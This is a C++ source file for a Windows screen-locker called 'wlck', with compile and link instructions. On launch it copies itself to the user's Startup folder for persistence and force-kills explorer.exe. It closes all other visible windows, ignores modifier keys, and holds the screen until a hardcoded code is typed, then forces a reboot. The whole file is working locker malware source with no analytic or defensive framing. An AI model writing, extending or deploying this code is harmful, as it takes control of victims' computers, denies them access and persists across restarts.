#include <iostream>
#include <string>
#include <cstdlib>
#include <Windows.h>
#include <windowsx.h>
#include <tchar.h>
#include <thread>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <winnt.h>
#include <conio.h>
#include <UIAnimation.h>
#include <lmcons.h>
#include <ShlObj.h>
#include <fstream>
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "UIAutomationCore.lib")
#pragma comment(lib, "shell32.lib")


//===================================================================
///Compile: cl /EHsc /c wlck.cpp
///Link: link /out:wlck.exe ico.res wlck.obj
//===================================================================


constexpr const char * access_code = "1337";
constexpr const char * window_title = "wlck";

bool copy_to_startup_folder(const std::string &executable_path) {
    char startup_folder_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_folder_path) != S_OK) {
        return false;
    }

    std::string target_path = startup_folder_path;
    target_path += "\\" + executable_path.substr(executable_path.find_last_of("\\/") + 1);

    if (CopyFileA(executable_path.c_str(), target_path.c_str(), FALSE) == 0) {
        return false;
    }

    return true;
}

BOOL CALLBACK closeAllWindows(HWND hwnd, LPARAM lParam) noexcept {
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

    if (strcmp(windowTitle, window_title) != 0 && IsWindowVisible(hwnd) && GetWindow(hwnd, GW_OWNER) == NULL) {
        PostMessage(hwnd, WM_CLOSE, 0, 0);
    }

    return TRUE;
}

int main(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    SetConsoleTitleA(window_title);
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD dw_mode = 0;
    GetConsoleMode(hStdin, &dw_mode);
    SetConsoleMode(hStdin, dw_mode | ENABLE_PROCESSED_INPUT);
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_MAXIMIZE);

    std::system("taskkill /im explorer.exe /f > nul");
    EnumWindows(closeAllWindows, 0);

    std::system("color c");
    std::system("cls");
    if (copy_to_startup_folder(exe_path)) {
        std::cout << "Injected successfully.\n";
    } else {
        std::cout << "Injection failed.\n";
    }
    std::cout << "Windows blocked.\nEnter code: ";
    std::string code = "";
    char ch = 'a';
    while (1) {
        if (GetAsyncKeyState(VK_MENU) & 0x8000 ||
            GetAsyncKeyState(VK_LWIN) & 0x8000 ||
            GetAsyncKeyState(VK_RWIN) & 0x8000 ||
            GetAsyncKeyState(VK_CONTROL) & 0x8000 ||
            GetAsyncKeyState(VK_SHIFT) & 0X8000) {
                continue;
            }
        ch = _getch();

        if (ch == '\r') {
            if (code == access_code) {
                break;
            } else {
                std::cout << "\nIncorrect!\nEnter code: ";
                code.clear();
            }
        } else {
            code += ch;
            std::cout << ch;
        }
    }
    std::cout << std::endl;
    std::system("color a");
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Windows unlocked.\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Your PC will restart now and you'll get the access back.\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
    HANDLE h_token;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(h_token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE);

    return EXIT_SUCCESS;
}